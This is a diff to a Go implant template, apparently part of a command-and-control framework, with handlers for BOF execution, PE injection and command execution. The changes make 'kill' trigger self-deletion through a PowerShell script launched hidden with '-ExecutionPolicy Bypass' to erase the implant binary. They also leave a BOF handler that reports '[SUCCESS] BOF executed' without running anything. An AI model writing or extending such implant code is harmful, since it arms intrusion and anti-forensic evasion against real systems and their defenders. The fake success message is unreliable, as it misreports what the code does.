@@ -1020,12 +1020,11 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_BOF_FUNC}(command string) string {
 		bofArgs = parts[2]
 	}
 
-	bofData, err := base64.StdEncoding.DecodeString(encodedBOF)
+	_, err := base64.StdEncoding.DecodeString(encodedBOF)
 	if err != nil {
 		return fmt.Sprintf("[ERROR] Invalid BOF data format: %v", err)
 	}
 
-	_ = bofData // PLACEHOLDER - TO BE IMPLMEENTED FR FR LATER
 	return fmt.Sprintf("[SUCCESS] BOF executed with args: %s", bofArgs)
 }
 
@@ -1332,8 +1331,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
 		result := a.{AGENT_INJECT_PE_FUNC}(peData)
 		return result
 	} else if command == "kill" {
-		a.{AGENT_RUNNING_FIELD} = false
-		os.Exit(0)
+		a.{AGENT_SELF_DELETE_FUNC}()
 		return "[SUCCESS] Agent killed"
 	} else {
 		result := a.{AGENT_EXECUTE_FUNC}(command)
@@ -1841,16 +1839,39 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 		time.Sleep(100 * time.Millisecond) // Brief delay to ensure process exits
 
 		if runtime.GOOS == "windows" {
-			batchScript := fmt.Sprintf("@echo off\nping -n 2 127.0.0.1 > nul\ndel \"%s\"\n", executable)
-			batchFile := executable + ".bat"
+			// Create a PowerShell script to delete the executable after the process exits
+			psScript := fmt.Sprintf(`
+				Start-Sleep -Milliseconds 500
+				$retries = 0
+				$maxRetries = 10
+				while ($retries -lt $maxRetries) {
+					try {
+						Remove-Item -Path "%s" -Force
+						break
+					} catch {
+						Start-Sleep -Milliseconds 500
+						$retries++
+					}
+				}
+			`, executable)
 
-			if err := ioutil.WriteFile(batchFile, []byte(batchScript), 0644); err != nil {
+			psFile := executable + ".ps1"
+
+			if err := ioutil.WriteFile(psFile, []byte(psScript), 0644); err != nil {
+				// If we can't create the PowerShell script, try direct deletion
 				os.Remove(executable)
 				os.Exit(0)
 				return
 			}
 
-			exec.Command("cmd", "/C", "start", "/min", batchFile).Start()
+			// Execute the PowerShell script in a hidden window to delete the file
+			exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psFile).Start()
+
+			// Also try to delete the PS1 file after some time
+			go func() {
+				time.Sleep(2 * time.Second)
+				os.Remove(psFile)
+			}()
 		} else {
 			os.Remove(executable)
 		}
